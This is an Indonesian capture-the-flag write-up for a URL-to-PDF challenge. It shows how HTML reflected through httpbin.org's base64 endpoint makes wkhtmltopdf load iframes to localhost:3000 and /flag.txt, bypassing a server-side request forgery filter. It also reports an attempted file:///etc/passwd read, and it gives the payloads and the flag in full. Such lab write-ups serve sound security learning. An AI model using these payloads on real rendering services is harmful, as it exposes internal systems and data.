# PDFify Writeup

## Ringkasan

Challenge ini kelihatannya seperti SSRF biasa: kita kasih URL, server fetch halaman itu, lalu render jadi PDF. Di halaman utama ada dua petunjuk yang sangat membantu:

- ada komentar `internal metrics service available on port 3000 (localhost only)`
- hasil resolusi DNS target URL dibocorkan lewat panel debug

Awalnya saya coba bypass filter SSRF langsung ke `127.0.0.1:3000`, variasi integer/octal/IPv6, sampai redirect dari host eksternal. Semuanya mentok di validasi.

Titik baliknya datang saat sadar bahwa yang dibatasi cuma **URL utama** yang kita submit. Setelah lolos validasi, halaman itu akan dirender oleh `wkhtmltopdf`. Berarti kalau saya bisa memberi **halaman HTML eksternal yang saya kontrol**, saya bisa menyuruh browser internal milik `wkhtmltopdf` memuat resource lain sendiri, termasuk `localhost`.

## Enumerasi awal

Target:

- `http://10.42.5.10/`
- stack: `Apache/2.4.65`, `PHP/8.1.34`
- renderer: `wkhtmltopdf 0.12.6` (terlihat dari metadata PDF hasil generate)

Beberapa temuan awal:

- `http://127.0.0.1:3000/` diblok dengan pesan `Invalid or disallowed IP`
- `http://127.0.0.1/server-status` kemungkinan menarik karena `/server-status` dari luar memberi `403`
- redirect ke `localhost` juga tetap diblok

Jadi bypass di level URL utama bukan jalur termudah.

## Ide eksploitasi

Saya butuh halaman eksternal yang isinya bisa saya set sendiri tanpa harus punya server publik. Untuk itu saya pakai endpoint reflektor sederhana:

- `https://httpbin.org/base64/<base64_html>`

Endpoint ini mengembalikan isi HTML yang kita encode, jadi aplikasi target menganggap ini URL eksternal biasa dan membiarkannya lewat.

Tes pertama:

```html
<html><body><h1>CTFTEST123</h1><p>hello world</p></body></html>
```

Setelah dirender, teks itu benar-benar muncul di PDF. Artinya kontrol HTML penuh berhasil.

## Pivot ke localhost

Berikutnya saya masukkan iframe ke service internal:

```html
<html><body>
  <iframe src="http://127.0.0.1:3000/" width="1200" height="2000"></iframe>
</body></html>
```

Hasil PDF menampilkan:

```text
Directory listing for /
flag.txt
```

Berarti service di `localhost:3000` bisa diakses oleh browser internal milik `wkhtmltopdf`, walaupun URL utama tidak boleh langsung menunjuk ke sana.

## Ambil flag

Payload final:

```html
<html><body>
  <iframe src="http://127.0.0.1:3000/flag.txt" width="1200" height="2000"></iframe>
</body></html>
```

Payload itu saya base64 lalu kirim lewat:

```text
https://httpbin.org/base64/<payload_base64>
```

Setelah PDF di-download dan diekstrak teksnya, flag muncul langsung:

```text
RAM{dns_r3b1nd_t0ctou_D1u4le_A_R3cord}
```

## Kenapa ini berhasil

Masalah utamanya ada di model keamanan aplikasi:

1. URL yang di-submit memang divalidasi agar tidak langsung menuju host internal.
2. Tapi setelah URL lolos, konten HTML dari URL itu dirender oleh `wkhtmltopdf`.
3. Browser internal di dalam `wkhtmltopdf` masih bebas memuat iframe ke `127.0.0.1`.
4. Akhirnya tercipta SSRF tahap kedua lewat resource yang di-embed, bukan lewat URL utama.

Ini secara praktis adalah server-side browsing ke resource internal.

## Catatan

- Mencoba `file:///etc/passwd` tidak berhasil karena diblok policy WebKit (`Error 102`).
- `iframe` ke `127.0.0.1/server-status` juga berhasil dan membuktikan resource localhost memang bisa diambil saat render.
- Nama challenge dan flag mengarah ke isu DNS rebinding / TOCTOU, tapi jalur yang paling pendek di instance ini justru SSRF lewat embedded resource pada renderer.
